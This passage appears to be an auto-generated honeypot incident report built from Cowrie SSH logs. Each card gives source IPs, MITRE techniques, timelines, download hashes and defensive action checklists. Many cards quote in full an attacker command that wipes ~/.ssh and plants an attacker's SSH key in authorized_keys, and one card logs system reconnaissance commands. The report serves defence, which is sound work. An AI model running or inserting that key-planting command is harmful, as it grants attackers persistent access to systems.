| `2026-05-13 08:28:57` | `cowrie.log.closed` |
| `2026-05-13 08:28:57` | `cowrie.session.params` |
| `2026-05-13 08:28:57` | `cowrie.command.input` |
| `2026-05-13 08:28:58` | `cowrie.session.file_download` |
| `2026-05-13 08:28:58` | `cowrie.log.closed` |
| `2026-05-13 08:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a81305c22cbe

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:29 |
| **Last Seen** | 2026-05-13 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:29:00` | `cowrie.session.connect` |
| `2026-05-13 08:29:00` | `cowrie.client.version` |
| `2026-05-13 08:29:00` | `cowrie.client.kex` |
| `2026-05-13 08:29:00` | `cowrie.login.success` |
| `2026-05-13 08:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62f570c9e33a

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:30 |
| **Last Seen** | 2026-05-13 08:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:30:45` | `cowrie.session.connect` |
| `2026-05-13 08:30:45` | `cowrie.client.version` |
| `2026-05-13 08:30:45` | `cowrie.client.kex` |
| `2026-05-13 08:30:45` | `cowrie.login.success` |
| `2026-05-13 08:30:46` | `cowrie.session.params` |
| `2026-05-13 08:30:46` | `cowrie.command.input` |
| `2026-05-13 08:30:46` | `cowrie.command.failed` |
| `2026-05-13 08:30:46` | `cowrie.log.closed` |
| `2026-05-13 08:30:46` | `cowrie.session.params` |
| `2026-05-13 08:30:46` | `cowrie.command.input` |
| `2026-05-13 08:30:46` | `cowrie.session.file_download` |
| `2026-05-13 08:30:46` | `cowrie.log.closed` |
| `2026-05-13 08:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20f91cca97c1

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:30 |
| **Last Seen** | 2026-05-13 08:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:30:48` | `cowrie.session.connect` |
| `2026-05-13 08:30:48` | `cowrie.client.version` |
| `2026-05-13 08:30:49` | `cowrie.client.kex` |
| `2026-05-13 08:30:49` | `cowrie.login.success` |
| `2026-05-13 08:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7c77a5779f6

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:34 |
| **Last Seen** | 2026-05-13 08:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:34:29` | `cowrie.session.connect` |
| `2026-05-13 08:34:29` | `cowrie.client.version` |
| `2026-05-13 08:34:29` | `cowrie.client.kex` |
| `2026-05-13 08:34:29` | `cowrie.login.success` |
| `2026-05-13 08:34:30` | `cowrie.session.params` |
| `2026-05-13 08:34:30` | `cowrie.command.input` |
| `2026-05-13 08:34:30` | `cowrie.command.failed` |
| `2026-05-13 08:34:30` | `cowrie.log.closed` |
| `2026-05-13 08:34:30` | `cowrie.session.params` |
| `2026-05-13 08:34:30` | `cowrie.command.input` |
| `2026-05-13 08:34:30` | `cowrie.session.file_download` |
| `2026-05-13 08:34:30` | `cowrie.log.closed` |
| `2026-05-13 08:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2137d2167ad8

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:34 |
| **Last Seen** | 2026-05-13 08:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:34:32` | `cowrie.session.connect` |
| `2026-05-13 08:34:32` | `cowrie.client.version` |
| `2026-05-13 08:34:32` | `cowrie.client.kex` |
| `2026-05-13 08:34:33` | `cowrie.login.success` |
| `2026-05-13 08:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74d45b5bbc26

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:36 |
| **Last Seen** | 2026-05-13 08:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:36:22` | `cowrie.session.connect` |
| `2026-05-13 08:36:22` | `cowrie.client.version` |
| `2026-05-13 08:36:23` | `cowrie.client.kex` |
| `2026-05-13 08:36:23` | `cowrie.login.success` |
| `2026-05-13 08:36:23` | `cowrie.session.params` |
| `2026-05-13 08:36:23` | `cowrie.command.input` |
| `2026-05-13 08:36:23` | `cowrie.command.failed` |
| `2026-05-13 08:36:24` | `cowrie.log.closed` |
| `2026-05-13 08:36:24` | `cowrie.session.params` |
| `2026-05-13 08:36:24` | `cowrie.command.input` |
| `2026-05-13 08:36:24` | `cowrie.session.file_download` |
| `2026-05-13 08:36:24` | `cowrie.log.closed` |
| `2026-05-13 08:36:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d13cac5475c5

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:36 |
| **Last Seen** | 2026-05-13 08:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:36:26` | `cowrie.session.connect` |
| `2026-05-13 08:36:26` | `cowrie.client.version` |
| `2026-05-13 08:36:26` | `cowrie.client.kex` |
| `2026-05-13 08:36:27` | `cowrie.login.success` |
| `2026-05-13 08:36:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1f9b6bd794b

| Field | Detail |
|---|---|
| **Source IP** | `181.52.238[.]13` |
| **First Seen** | 2026-05-13 08:52 |
| **Last Seen** | 2026-05-13 08:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:52:18` | `cowrie.session.connect` |
| `2026-05-13 08:52:18` | `cowrie.client.version` |
| `2026-05-13 08:52:18` | `cowrie.client.kex` |
| `2026-05-13 08:52:20` | `cowrie.login.success` |
| `2026-05-13 08:52:20` | `cowrie.session.params` |
| `2026-05-13 08:52:20` | `cowrie.command.input` |
| `2026-05-13 08:52:20` | `cowrie.command.failed` |
| `2026-05-13 08:52:21` | `cowrie.log.closed` |
| `2026-05-13 08:52:21` | `cowrie.session.params` |
| `2026-05-13 08:52:21` | `cowrie.command.input` |
| `2026-05-13 08:52:22` | `cowrie.session.file_download` |
| `2026-05-13 08:52:22` | `cowrie.log.closed` |
| `2026-05-13 08:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.52.238[.]13` to AbuseIPDB if not already reported
- [ ] Block `181.52.238[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c979924f8c9

| Field | Detail |
|---|---|
| **Source IP** | `181.52.238[.]13` |
| **First Seen** | 2026-05-13 08:52 |
| **Last Seen** | 2026-05-13 08:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:52:25` | `cowrie.session.connect` |
| `2026-05-13 08:52:25` | `cowrie.client.version` |
| `2026-05-13 08:52:26` | `cowrie.client.kex` |
| `2026-05-13 08:52:27` | `cowrie.login.success` |
| `2026-05-13 08:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.52.238[.]13` to AbuseIPDB if not already reported
- [ ] Block `181.52.238[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8738f403047d

| Field | Detail |
|---|---|
| **Source IP** | `125.140.145[.]62` |
| **First Seen** | 2026-05-13 08:52 |
| **Last Seen** | 2026-05-13 08:54 |
| **Session Duration** | 131s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:52:41` | `cowrie.session.connect` |
| `2026-05-13 08:52:41` | `cowrie.client.version` |
| `2026-05-13 08:52:41` | `cowrie.client.kex` |
| `2026-05-13 08:52:47` | `cowrie.login.failed` |
| `2026-05-13 08:52:48` | `cowrie.login.success` |
| `2026-05-13 08:52:48` | `cowrie.session.params` |
| `2026-05-13 08:52:48` | `cowrie.command.input` |
| `2026-05-13 08:52:48` | `cowrie.command.failed` |
| `2026-05-13 08:52:48` | `cowrie.log.closed` |
| `2026-05-13 08:52:49` | `cowrie.session.params` |
| `2026-05-13 08:52:49` | `cowrie.command.input` |
| `2026-05-13 08:52:49` | `cowrie.log.closed` |
| `2026-05-13 08:52:49` | `cowrie.session.params` |
| `2026-05-13 08:52:49` | `cowrie.command.input` |
| `2026-05-13 08:52:49` | `cowrie.log.closed` |
| `2026-05-13 08:52:50` | `cowrie.session.params` |
| `2026-05-13 08:52:50` | `cowrie.command.input` |
| `2026-05-13 08:52:50` | `cowrie.log.closed` |
| `2026-05-13 08:52:50` | `cowrie.session.params` |
| `2026-05-13 08:52:50` | `cowrie.command.input` |
| `2026-05-13 08:52:50` | `cowrie.log.closed` |
| `2026-05-13 08:52:51` | `cowrie.session.params` |
| `2026-05-13 08:52:51` | `cowrie.command.input` |
| `2026-05-13 08:52:51` | `cowrie.log.closed` |
| `2026-05-13 08:52:51` | `cowrie.session.params` |
| `2026-05-13 08:52:51` | `cowrie.command.input` |
| `2026-05-13 08:52:51` | `cowrie.log.closed` |
| `2026-05-13 08:52:52` | `cowrie.session.params` |
| `2026-05-13 08:52:52` | `cowrie.command.input` |
| `2026-05-13 08:52:52` | `cowrie.log.closed` |
| `2026-05-13 08:52:52` | `cowrie.session.params` |
| `2026-05-13 08:52:52` | `cowrie.command.input` |
| `2026-05-13 08:52:52` | `cowrie.log.closed` |
| `2026-05-13 08:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.140.145[.]62` to AbuseIPDB if not already reported
- [ ] Block `125.140.145[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca3ed8a036be

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 08:55 |
| **Last Seen** | 2026-05-13 08:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:55:05` | `cowrie.session.connect` |
| `2026-05-13 08:55:05` | `cowrie.client.version` |
| `2026-05-13 08:55:05` | `cowrie.client.kex` |
| `2026-05-13 08:55:06` | `cowrie.login.success` |
| `2026-05-13 08:55:06` | `cowrie.session.params` |
| `2026-05-13 08:55:06` | `cowrie.command.input` |
| `2026-05-13 08:55:06` | `cowrie.command.failed` |
| `2026-05-13 08:55:06` | `cowrie.log.closed` |
| `2026-05-13 08:55:06` | `cowrie.session.params` |
| `2026-05-13 08:55:06` | `cowrie.command.input` |
| `2026-05-13 08:55:07` | `cowrie.session.file_download` |
| `2026-05-13 08:55:07` | `cowrie.log.closed` |
| `2026-05-13 08:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b62b88f1ae0

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 08:55 |
| **Last Seen** | 2026-05-13 08:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:55:08` | `cowrie.session.connect` |
| `2026-05-13 08:55:08` | `cowrie.client.version` |
| `2026-05-13 08:55:08` | `cowrie.client.kex` |
| `2026-05-13 08:55:09` | `cowrie.login.success` |
| `2026-05-13 08:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-718d6623b6c9

| Field | Detail |
|---|---|
| **Source IP** | `116.123.150[.]231` |
| **First Seen** | 2026-05-13 08:58 |
| **Last Seen** | 2026-05-13 08:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:58:00` | `cowrie.session.connect` |
| `2026-05-13 08:58:00` | `cowrie.client.version` |
| `2026-05-13 08:58:00` | `cowrie.client.kex` |
| `2026-05-13 08:58:00` | `cowrie.login.success` |
| `2026-05-13 08:58:01` | `cowrie.session.params` |
| `2026-05-13 08:58:01` | `cowrie.command.input` |
| `2026-05-13 08:58:01` | `cowrie.command.failed` |
| `2026-05-13 08:58:01` | `cowrie.log.closed` |
| `2026-05-13 08:58:01` | `cowrie.session.params` |
| `2026-05-13 08:58:01` | `cowrie.command.input` |
| `2026-05-13 08:58:02` | `cowrie.session.file_download` |
| `2026-05-13 08:58:02` | `cowrie.log.closed` |
| `2026-05-13 08:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.123.150[.]231` to AbuseIPDB if not already reported
- [ ] Block `116.123.150[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b49c50c354d3

| Field | Detail |
|---|---|
| **Source IP** | `116.123.150[.]231` |
| **First Seen** | 2026-05-13 08:58 |
| **Last Seen** | 2026-05-13 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:58:06` | `cowrie.session.connect` |
| `2026-05-13 08:58:06` | `cowrie.client.version` |
| `2026-05-13 08:58:06` | `cowrie.client.kex` |
| `2026-05-13 08:58:06` | `cowrie.login.success` |
| `2026-05-13 08:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.123.150[.]231` to AbuseIPDB if not already reported
- [ ] Block `116.123.150[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf21a6a873d5

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:02 |
| **Last Seen** | 2026-05-13 09:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:02:41` | `cowrie.session.connect` |
| `2026-05-13 09:02:41` | `cowrie.client.version` |
| `2026-05-13 09:02:41` | `cowrie.client.kex` |
| `2026-05-13 09:02:42` | `cowrie.login.success` |
| `2026-05-13 09:02:42` | `cowrie.session.params` |
| `2026-05-13 09:02:42` | `cowrie.command.input` |
| `2026-05-13 09:02:42` | `cowrie.command.failed` |
| `2026-05-13 09:02:42` | `cowrie.log.closed` |
| `2026-05-13 09:02:43` | `cowrie.session.params` |
| `2026-05-13 09:02:43` | `cowrie.command.input` |
| `2026-05-13 09:02:43` | `cowrie.session.file_download` |
| `2026-05-13 09:02:43` | `cowrie.log.closed` |
| `2026-05-13 09:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a34a0480cdf7

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:02 |
| **Last Seen** | 2026-05-13 09:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:02:45` | `cowrie.session.connect` |
| `2026-05-13 09:02:45` | `cowrie.client.version` |
| `2026-05-13 09:02:45` | `cowrie.client.kex` |
| `2026-05-13 09:02:45` | `cowrie.login.success` |
| `2026-05-13 09:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44e048ed9838

| Field | Detail |
|---|---|
| **Source IP** | `116.123.150[.]231` |
| **First Seen** | 2026-05-13 09:03 |
| **Last Seen** | 2026-05-13 09:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
